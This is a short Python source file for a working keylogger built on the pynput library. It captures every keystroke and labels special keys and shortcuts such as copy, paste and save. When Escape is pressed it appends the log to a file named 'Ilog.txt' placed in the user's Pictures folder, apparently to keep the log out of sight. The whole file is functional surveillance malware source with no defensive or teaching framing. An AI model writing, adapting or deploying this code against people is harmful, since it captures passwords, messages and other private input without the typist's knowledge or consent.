import os
import random
from pynput.keyboard import Key,Listener

count = 0
logged_data = []

def on_press(key):
	# global count, logged_data
	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	key = str(key).strip('\'')
	if key in substitution:
		logged_data.append(substitution[substitution.index(key)+1])
	else:
		logged_data.append(key)
	
	# count += 1
	# if count >=1000:
	# 	count = 0
	# 	write_file(logged_data)
	# 	logged_data = []


def write_file(logged_data):
	filepath = os.path.expanduser('~') + '/Pictures/'
	filename = 'Ilog.txt'
	file = filepath + filename
	with open(file,'a') as fp:
		for key in logged_data:
			k = str(key).replace("'","")
			fp.write(k)

def on_release(key):
	global logged_data
	if key == Key.esc:
		write_file(logged_data)
		logged_data = []
		return False

def main():
	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

if __name__=='__main__':
	main()

